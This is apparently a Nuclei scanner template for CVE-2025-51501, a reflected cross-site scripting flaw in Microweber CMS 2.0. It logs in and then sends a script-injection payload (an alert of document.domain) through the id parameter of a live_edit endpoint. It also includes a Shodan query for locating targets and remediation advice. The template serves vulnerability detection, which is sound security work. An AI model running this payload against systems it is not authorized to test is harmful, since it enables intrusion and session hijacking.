flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "success\":", "username\":")
    internal: true
    type: dsl
  raw:
  - 'POST /api/user_login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    username={{username}}&password={{password}}&lang=en_US&where_to=admin_content

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body, "</script><script>alert(document.domain)</script>", "Add
      Country</a>")
    type: dsl
  raw:
  - 'GET /api/live_edit/live_edit.module_settings?id={{xss_payload}}&type=shop/shipping/gateways/country/admin
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-51501
info:
  author: nukunga
  description: 'Reflected Cross-Site Scripting (XSS) in the `id` parameter of the
    `live_edit.module_settings` API endpoint in Microweber CMS2.0 allows execution
    of arbitrary JavaScript.

    '
  impact: 'Authenticated attackers can execute arbitrary JavaScript in victim browsers
    through the id parameter in the module_settings API, potentially leading to session
    hijacking.

    '
  metadata:
    max-requests: 2
    product: microweber
    shodan-query: http.title:"Microweber"
    vendor: microweber
    verified: true
  name: Microweber CMS2.0 - Cross-Site Scripting
  reference:
  - https://github.com/progprnv/CVE-Reports/blob/main/CVE-2025-51501
  - https://nvd.nist.gov/vuln/detail/CVE-2025-51501
  remediation: 'Upgrade Microweber CMS to a version later than 2.0 that properly sanitizes
    the id parameter in live_edit endpoints.

    '
  severity: medium
  tags: cve,cve2025,microweber,xss,authenticated,vuln
variables:
  xss_payload: </script><script>alert(document.domain)</script>
